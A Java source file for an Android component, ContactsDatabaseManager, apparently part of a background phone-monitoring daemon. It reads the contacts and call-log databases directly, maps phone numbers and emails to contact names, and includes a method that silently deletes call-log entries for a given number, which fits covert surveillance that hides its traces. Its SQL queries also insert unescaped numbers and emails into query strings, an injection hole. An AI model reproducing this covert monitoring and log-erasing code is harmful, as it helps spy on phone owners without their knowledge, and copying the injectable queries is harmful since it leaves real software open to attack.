package com.vvt.contacts;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Iterator;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.telephony.PhoneNumberUtils;

import com.vvt.daemon.util.Customization;
import com.vvt.logger.FxLog;
import com.vvt.telephony.TelephonyUtils;

public class ContactsDatabaseManager {
	
	private static final String TAG = "ContactsDatabaseManager";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	public static long getLatestCallLogId() {
		if (LOGV) FxLog.v(TAG, "getLatestCallLogId # ENTER ...");
		
		SQLiteDatabase db = ContactsDatabaseHelper.getReadableDatabase(true);
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if (LOGV) FxLog.v(TAG, "getLatestCallLogId # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return -1;
		}
		
		// Check database path
		String dbPath = db.getPath();
		if (dbPath != null) {
			if (LOGV) FxLog.v(TAG, String.format("getLatestCallLogId # dbPath: %s", dbPath));
		}
		boolean isLogsInSamsung = dbPath.contains(ContactsDatabaseHelper.LOGS_DB_NAME_IN_SAMSUNG);
		
		Cursor cursor = null;
		try {
			String sql = null;
			if (isLogsInSamsung) {
				sql = String.format("SELECT MAX(%s) FROM %s WHERE %s = %d", 
						ContactsDatabaseHelper.COLUMN_ID, ContactsDatabaseHelper.TABLE_LOGS, 
						ContactsDatabaseHelper.COLUMN_LOGTYPE, 100);
			}
			else {
				sql = String.format("SELECT MAX(%s) FROM %s", 
						ContactsDatabaseHelper.COLUMN_ID, ContactsDatabaseHelper.TABLE_CALLS);
			}
			
			cursor = db.rawQuery(sql, null);
		}
		catch (SQLiteException e) {
			if (LOGE) FxLog.e(TAG, String.format("getLatestCallLogId # error: %s", e.toString()));
		}
		
		if (cursor == null || cursor.getCount() == 0) {
			if (LOGV) FxLog.v(TAG, "getLatestCallLogId # Query database FAILED!! -> EXIT ...");
			if (cursor != null) {
				cursor.close();
			}
			db.close();
			return -1;
		}
		
		long id = -1;
		if (cursor.moveToNext()) {
			id = cursor.getLong(0);
		}
		
		cursor.close();
		db.close();
		
		if (LOGV) FxLog.v(TAG, String.format("getLatestCallLogId # id: %d", id));
		if (LOGV) FxLog.v(TAG, "getLatestCallLogId # EXIT ...");
		return id;
	}
	
	public static int deleteNumberFromCallLog(String number) {
		SQLiteDatabase db = ContactsDatabaseHelper.getWritableDatabase();
		
		if (db == null) {
			if (LOGV) FxLog.v(TAG, "deleteNumberFromCallLog # Open database FAILED!! -> EXIT ...");
			return 0;
		}
		
		int deleledRows = db.delete(
				ContactsDatabaseHelper.TABLE_CALLS, 
				String.format("%s=?", ContactsDatabaseHelper.COLUMN_NUMBER),  
				new String[] { number } );
		
		db.close();
		return deleledRows;
	}
	
	/**
	 * Get contact name from specific phone number. 
	 * Please make sure that Contacts database is available (not being used by others)
	 * @param phone number of the specific contact
	 * @return contact name
	 */
	public static String getContactNameByPhone(String number) {
		if (LOGV) FxLog.v(TAG, "getContactNameByPhone # ENTER ...");
		String contactName = null;
		
		SQLiteDatabase db = ContactsDatabaseHelper.getReadableDatabase(false);
		if (db == null) {
			if (LOGV) FxLog.v(TAG, "getContactNameByPhone # Open database FAILED!! -> EXIT ...");
			return null;
		}
		
		String dbPath = db.getPath();
		if (dbPath != null) {
			if (LOGV) FxLog.v(TAG, String.format("getContactNameByPhone # dbPath: %s", dbPath));
		}
		
		String sql = dbPath.contains(ContactsDatabaseHelper.CONTACTS_DB_NAME_IN_CUPCAKE)?
				getSqlQueryContactNameByNumberInCupcake(number):
					getSqlQueryContactNameByNumberInEclair(number);
		
		Cursor cursor = null;
		try {
			cursor = db.rawQuery(sql, null);
			if (cursor == null || cursor.getCount() == 0) {
				if (LOGV) FxLog.v(TAG, "getContactNameByPhone # Query FAILED!! -> EXIT ...");
				if (cursor!= null) {
					cursor.close();
				}
				db.close();
				return null;
			}
			
			while (cursor.moveToNext()) {
				contactName = cursor.getString(cursor.getColumnIndex(
						ContactsDatabaseHelper.COLUMN_NAME));
				break; // Only one contact name is enough
			}
			cursor.close();
			db.close();
		}
		catch (SQLiteException e) {
			if (LOGE) FxLog.e(TAG, String.format(
					"getContactNameByPhone # Error: %s", e.toString()));
		}
		finally {
			if (cursor != null) cursor.close();
			if (db != null) db.close();
		}
		
		if (LOGV) FxLog.v(TAG, String.format("getContactNameByPhone # contactName: %s", contactName));
		if (LOGV) FxLog.v(TAG, "getContactNameByPhone # EXIT ...");
		
		return contactName;
	}
	
	public static String getContactNameByEmail(String[] emails) {
		if (LOGV) FxLog.v(TAG, "getContactNamesByEmails # ENTER ...");
		if (LOGV) FxLog.v(TAG, String.format(
				"getContactNamesByEmails # emails: %s", 
				emails == null ? null : Arrays.toString(emails)));
		
		if (emails == null || emails.length < 1) {
			if (LOGV) FxLog.v(TAG, "getContactNamesByEmails # Emails NOT found!! -> EXIT ...");
			return null;
		}
		
		SQLiteDatabase db = ContactsDatabaseHelper.getReadableDatabase(false);
		if (db == null) {
			if (LOGV) FxLog.v(TAG, "getContactNameByEmail # Open database FAILED!! -> EXIT ...");
			return null;
		}
		
		String dbPath = db.getPath();
		if (dbPath != null) {
			if (LOGV) FxLog.v(TAG, String.format("getContactNameByEmail # dbPath: %s", dbPath));
		}
		
		boolean isDatabaseInCupcake = dbPath.contains(
				ContactsDatabaseHelper.CONTACTS_DB_NAME_IN_CUPCAKE);
		
		ArrayList<String> contactList = new ArrayList<String>();
		for (String email : emails) {
			contactList.add(selectEmailContactName(email, isDatabaseInCupcake, db));
		}
		db.close();
		
		String contact = null;
		StringBuilder builder = new StringBuilder();
		for (Iterator<String> it = contactList.iterator(); it.hasNext(); ) {
			contact = it.next();
			if (contact == null || contact.contains("null")) {
				continue;
			}
			if (builder.length() > 0) {
				builder.append("; ");
			}
			builder.append(contact);
		}
		
		String result = builder.toString();
		
		if (LOGV) FxLog.v(TAG, String.format("getContactNameByEmail # result: %s", result));
		if (LOGV) FxLog.v(TAG, "getContactNameByEmail # EXIT ...");
		
		return result;
	}
	
	private static String selectEmailContactName(
			String email, boolean isDatabaseInCupcake, SQLiteDatabase db) {

		String sql = isDatabaseInCupcake ? 
				getSqlQueryContactNameByEmailInCupcake(email) :
					getSqlQueryContactNameByEmailInEclair(email);
		
		HashSet<String> contactResult = new HashSet<String>();
				
		String name = null;
		Cursor cursor = null;
		try {
			cursor = db.rawQuery(sql, null);
			if (cursor != null) {
				while (cursor.moveToNext()) {
					name = cursor.getString(
							cursor.getColumnIndex(
									ContactsDatabaseHelper.COLUMN_NAME));
					
					if (name == null) continue;
					else {
						name = name.trim();
						if (name.length() == 0 || 
								name.equalsIgnoreCase("null") || 
								name.equalsIgnoreCase("{null}") ||
								name.contains("@")) {
							continue;
						}
						else {
							if (LOGV) FxLog.v(TAG,  String.format(
									"selectEmailContactName # Add: %s", name));
							contactResult.add(name);
						}
					}
				}
				cursor.close();
			}
		}
		catch (SQLiteException e) {
			if (LOGE) FxLog.e(TAG, String.format("selectEmailContactName # Error: %s", e.toString()));
		}
		finally {
			if (cursor != null) cursor.close();
		}
		
		StringBuilder builder = new StringBuilder();
		Iterator<String> it = contactResult.iterator();
		while (it.hasNext()) {
			if (builder.length() > 0) builder.append(" or ").append(it.next());
			else builder.append(it.next());
		}
		
		return builder.length() == 0 ? email : builder.toString();
	}

	// For API level 6 or below
	private static String getSqlQueryContactNameByNumberInCupcake(String phoneNumber) {
//		Log.v(TAG, "getSqlQueryContactNameByNumber # ENTER ...");
		
		String cleanedNumber = TelephonyUtils.cleanPhoneNumber(phoneNumber);
//		if (LOGV) FxLog.v(TAG, String.format(
//				"getSqlQueryContactNameByNumber # number = %s, cleaned: %s", 
//				phoneNumber, cleanedNumber));
		
		String replaceClause = String.format(
				"LTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(" +
				"%s.%s, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0)", 
				ContactsDatabaseHelper.TABLE_PHONES, ContactsDatabaseHelper.COLUMN_NUMBER);
		
		// select ltrim(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(phones.number, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0) as normalized_number, people.name
		// from phones
		// left join people on people._id = phones.person
		// where length('+66806168597') > 4 and ( 
		// (length('+66806168597') <= length(normalized_number) and normalized_number like '%+66806168597') 
		// or  
		// (length('+66806168597') > length(normalized_number) and normalized_number = substr('+66806168597', length('+66806168597') - length(normalized_number) + 1, length(normalized_number))))
		String sql = String.format("SELECT %s AS normalized_number, %s.%s " +
				"FROM %s LEFT JOIN %s ON %s.%s = %s.%s " +
				"WHERE " +
				"(LENGTH(normalized_number) > 4 AND LENGTH('%s') > 4) AND (" +
				"(LENGTH('%s') <= LENGTH(normalized_number) AND normalized_number LIKE '%s%s') " +
				"OR " +
				"(LENGTH('%s') > LENGTH(normalized_number) AND " +
				"normalized_number = SUBSTR('%s', LENGTH('%s') - LENGTH(normalized_number) + 1, LENGTH(normalized_number))))",
				replaceClause, 
				ContactsDatabaseHelper.TABLE_PEOPLE, ContactsDatabaseHelper.COLUMN_NAME, 
				ContactsDatabaseHelper.TABLE_PHONES, 
				ContactsDatabaseHelper.TABLE_PEOPLE, 
				ContactsDatabaseHelper.TABLE_PEOPLE, ContactsDatabaseHelper.COLUMN_ID, 
				ContactsDatabaseHelper.TABLE_PHONES, ContactsDatabaseHelper.COLUMN_PERSON, 
				cleanedNumber, cleanedNumber, "%", cleanedNumber, 
				cleanedNumber, cleanedNumber, cleanedNumber
				);
		
//		if (LOGV) FxLog.v(TAG, String.format("getSqlQueryContactNameByNumber # sql: %s", sql));
//		if (LOGV) FxLog.v(TAG, "getSqlQueryContactNameByNumber # EXIT ...");
		
		return sql;
	}
	
	// For API level 7 or above 
	private static String getSqlQueryContactNameByNumberInEclair(String phoneNumber) {
//		if (LOGV) FxLog.v(TAG, "getSqlQueryContactNameByNumber # ENTER ...");
		
		String cleanedNumber = TelephonyUtils.cleanPhoneNumber(phoneNumber);
		String reverseNumber = PhoneNumberUtils.getStrippedReversed(cleanedNumber);
		
//		if (LOGV) FxLog.v(TAG, String.format(
//				"getSqlQueryContactNameByNumber # number = %s, cleaned: %s, reversed: %s", 
//				phoneNumber, cleanedNumber, reverseNumber));
		
		// Prepare SELECT statement for non-reversed normalized_number
		
		//	SELECT LTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(normalized_number, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0) AS number, display_name AS name 
		//	FROM phone_lookup 
		//	LEFT JOIN raw_contacts ON phone_lookup.raw_contact_id = raw_contacts._id 
		//	WHERE (
		//		(LENGTH(number) > 4 AND LENGTH('896856966') > 4) 
		//		AND (
		//			(LENGTH('896856966') <= LENGTH(number) AND number LIKE '%896856966')
		//			OR (LENGTH('896856966') > LENGTH(number) AND number = SUBSTR('896856966', -LENGTH(number)))
		//		)
		//	)
		
		String normalReplaceClause = String.format(
				"LTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(" +
				"%s, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0)",
				
				ContactsDatabaseHelper.COLUMN_NORMALIZED_NUMBER);
		String normalCondition = String.format(
				"(LENGTH(number) > 4 AND LENGTH('%s') > 4) AND (" + 
				"(LENGTH('%s') <= LENGTH(number) AND number LIKE '%s%s') " +
				"OR " +
				"(LENGTH('%s') > LENGTH(number) AND number = SUBSTR('%s', -LENGTH(number))))", 
				cleanedNumber, cleanedNumber, "%", cleanedNumber, cleanedNumber, cleanedNumber);
		
		String normalSelect = String.format(
				"SELECT %s AS number, %s AS name " +
				"FROM %s LEFT JOIN %s " +
				"ON %s.%s = %s.%s " +
				"WHERE (%s)", 
				normalReplaceClause, ContactsDatabaseHelper.COLUMN_DISPLAY_NAME,
				ContactsDatabaseHelper.TABLE_PHONE_LOOKUP, ContactsDatabaseHelper.TABLE_RAW_CONTACTS, 
				ContactsDatabaseHelper.TABLE_PHONE_LOOKUP, ContactsDatabaseHelper.COLUMN_RAW_CONTACT_ID,
				ContactsDatabaseHelper.TABLE_RAW_CONTACTS, ContactsDatabaseHelper.COLUMN_ID,
				normalCondition);
		
		// Prepare SELECT statement for reversed normalized_number
		
		//	SELECT RTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(normalized_number, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0) AS number, display_name AS name 
		//	FROM phone_lookup 
		//	LEFT JOIN raw_contacts ON phone_lookup.raw_contact_id = raw_contacts._id 
		//	WHERE (
		//		(LENGTH(number) > 4 AND LENGTH('669658698') > 4) 
		//		AND (
		//			(LENGTH('669658698') <= LENGTH(number) AND number LIKE '669658698%') 
		//			OR (LENGTH('669658698') > LENGTH(number) AND number = SUBSTR('669658698', 1, LENGTH(number)))
		//		)
		//	)
		
		String reversedReplaceClause = String.format(
				"RTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(" +
				"%s, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0)", 
				ContactsDatabaseHelper.COLUMN_NORMALIZED_NUMBER);
		
		String reversedCondition = String.format(
				"(LENGTH(number) > 4 AND LENGTH('%s') > 4) AND (" + 
				"(LENGTH('%s') <= LENGTH(number) AND number LIKE '%s%s') " +
				"OR " +
				"(LENGTH('%s') > LENGTH(number) AND number = SUBSTR('%s', 1, LENGTH(number))))", 
				reverseNumber, reverseNumber, reverseNumber, "%", reverseNumber, reverseNumber);
		
		String reversedSelect = String.format(
				"SELECT %s AS number, %s AS name " +
				"FROM %s LEFT JOIN %s " +
				"ON %s.%s = %s.%s " +
				"WHERE (%s)", 
				reversedReplaceClause, 
				ContactsDatabaseHelper.COLUMN_DISPLAY_NAME,
				ContactsDatabaseHelper.TABLE_PHONE_LOOKUP,
				ContactsDatabaseHelper.TABLE_RAW_CONTACTS, 
				ContactsDatabaseHelper.TABLE_PHONE_LOOKUP, ContactsDatabaseHelper.COLUMN_RAW_CONTACT_ID,
				ContactsDatabaseHelper.TABLE_RAW_CONTACTS, ContactsDatabaseHelper.COLUMN_ID,
				reversedCondition);
		
		String sql = String.format("%s UNION %s", normalSelect, reversedSelect);
		
//		if (LOGV) FxLog.v(TAG, String.format("getSqlQueryContactNameByNumber # sql: %s", sql));
//		if (LOGV) FxLog.v(TAG, "getSqlQueryContactNameByNumber # EXIT ...");
		
		return sql;
	}
	
	private static String getSqlQueryContactNameByEmailInCupcake(String email) {
//		if (LOGV) FxLog.v(TAG, "getSqlQueryContactNameByEmail # ENTER ...");
		
		// select people.name, contact_methods.data
		// from contact_methods
		// left join people on people._id = contact_methods.person
		String sql = String.format("SELECT %s.%s, %s.%s " +
				"FROM %s LEFT JOIN %s ON %s.%s = %s.%s " +
				"WHERE %s = '%s'", 
				ContactsDatabaseHelper.TABLE_PEOPLE, ContactsDatabaseHelper.COLUMN_NAME, 
				ContactsDatabaseHelper.TABLE_CONTACT_METHODS, ContactsDatabaseHelper.COLUMN_DATA, 
				ContactsDatabaseHelper.TABLE_CONTACT_METHODS, 
				ContactsDatabaseHelper.TABLE_PEOPLE, 
				ContactsDatabaseHelper.TABLE_PEOPLE, ContactsDatabaseHelper.COLUMN_ID, 
				ContactsDatabaseHelper.TABLE_CONTACT_METHODS, ContactsDatabaseHelper.COLUMN_PERSON, 
				ContactsDatabaseHelper.COLUMN_DATA, email);
		
//		if (LOGV) FxLog.v(TAG, String.format("getContactNameByEmail # sql: %s", sql));
//		if (LOGV) FxLog.v(TAG, "getContactNameByEmail # EXIT ...");
		
		return sql;
	}
	
	private static String getSqlQueryContactNameByEmailInEclair(String email) {
//		if (LOGV) FxLog.v(TAG, "getSqlQueryContactNameByEmail # ENTER ...");
		
		// select data1, display_name from data 
		// left join name_lookup on name_lookup.data_id = data._id
		// left join raw_contacts on name_lookup.raw_contact_id = raw_contacts._id
		// where data1 like '%@%'
		String sql = String.format("SELECT %s as data, %s as name FROM %s " +
				"LEFT JOIN %s ON %s.%s = %s.%s " +
				"LEFT JOIN %s ON %s.%s = %s.%s " +
				"WHERE %s = '%s'", 
				ContactsDatabaseHelper.COLUMN_DATA_1, ContactsDatabaseHelper.COLUMN_DISPLAY_NAME, 
				ContactsDatabaseHelper.TABLE_DATA, 
				ContactsDatabaseHelper.TABLE_NAME_LOOKUP, 
				ContactsDatabaseHelper.TABLE_NAME_LOOKUP, ContactsDatabaseHelper.COLUMN_DATA_ID,
				ContactsDatabaseHelper.TABLE_DATA, ContactsDatabaseHelper.COLUMN_ID,
				ContactsDatabaseHelper.TABLE_RAW_CONTACTS,
				ContactsDatabaseHelper.TABLE_NAME_LOOKUP, 
				ContactsDatabaseHelper.COLUMN_RAW_CONTACT_ID,
				ContactsDatabaseHelper.TABLE_RAW_CONTACTS, ContactsDatabaseHelper.COLUMN_ID, 
				ContactsDatabaseHelper.COLUMN_DATA_1, email);
		
//		if (LOGV) FxLog.v(TAG, String.format("getContactNameByEmail # sql: %s", sql));
//		if (LOGV) FxLog.v(TAG, "getContactNameByEmail # EXIT ...");
		
		return sql;
	}
	
}
